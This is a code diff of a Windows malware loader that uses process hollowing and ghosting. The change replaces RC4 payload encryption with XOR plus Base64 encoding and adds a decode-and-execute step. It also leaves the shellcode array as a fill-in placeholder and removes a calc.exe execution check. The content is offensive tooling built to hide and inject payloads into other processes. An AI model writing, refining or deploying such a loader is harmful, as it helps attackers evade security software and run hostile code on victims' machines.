@@ -7,18 +7,10 @@
 #include "Syscalls.h"
 #include "Hollowing.h"
 #include "Ghosting.h"
+#include "AdvancedEncryption.h"
+#include "Base64Utils.h"  // Add this include
 
-// Define a simple verification function
-bool CheckPayloadExecution() {
-    // This could be a reverse shell success check or a connection attempt
-    // For simplicity, let's log success based on a simple operation, like launching calc.exe
-    if (system("calc.exe") == 0) {
-        printf("[+] Payload (calc.exe) successfully executed.\n");
-        return true;
-    }
-    return false;
-}
-
+// Main function logic
 int main() {
     HANDLE hProcess = NULL, hThread = NULL;
     SyscallStruct St;
@@ -29,17 +21,18 @@ int main() {
         return -1;
     }
 
-    // Step 1: Define the payload and RC4 encryption key
+    // Step 1: Define the payload and XOR encryption key
     printf("[*] Defining payload and encryption key...\n");
     unsigned char payload[] = {
-        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xCC // Example shellcode (NOP sled with INT3 for debugging)
+        // Your shellcode goes here
     };
     unsigned char key[] = { 0x11, 0x22, 0x33, 0x44 };  // Example key
 
-    // Step 2: Encrypt the payload using RC4
-    printf("[*] Encrypting payload with RC4...\n");
-    RC4Encrypt(payload, sizeof(payload), key, sizeof(key));
-    printf("[+] Payload encrypted successfully.\n");
+    // Step 2: XOR encrypt the payload and then Base64 encode it
+    printf("[*] Encrypting payload with XOR and Base64 encoding...\n");
+    XOREncrypt(payload, sizeof(payload), key, sizeof(key));
+    std::string encoded_payload = Base64Encode(payload, sizeof(payload));
+    printf("[+] Payload encrypted and encoded successfully.\n");
 
     // Dynamically retrieve temp path for the fake executable
     char tempPath[MAX_PATH];
@@ -70,16 +63,14 @@ int main() {
         return -1;
     }
 
-    // Step 4: Resume the thread to execute the payload
+    // Step 4: Decode the payload and execute it
+    std::vector<unsigned char> decoded_payload = Base64Decode(encoded_payload);
+    LoadAndExecutePayload(decoded_payload.data(), decoded_payload.size(), key, sizeof(key));
+
+    // Step 5: Resume the thread to execute the payload
     printf("[*] Resuming the thread to execute the payload...\n");
     ResumeThread(hThread);
     printf("[+] Thread resumed, payload should now execute.\n");
-
-    // Step 5: Check if the payload was successfully executed
-    if (!CheckPayloadExecution()) {
-        printf("[!] Payload execution failed.\n");
-        return -1;
-    }
 
     // Close handles after use
     CloseHandle(hProcess);
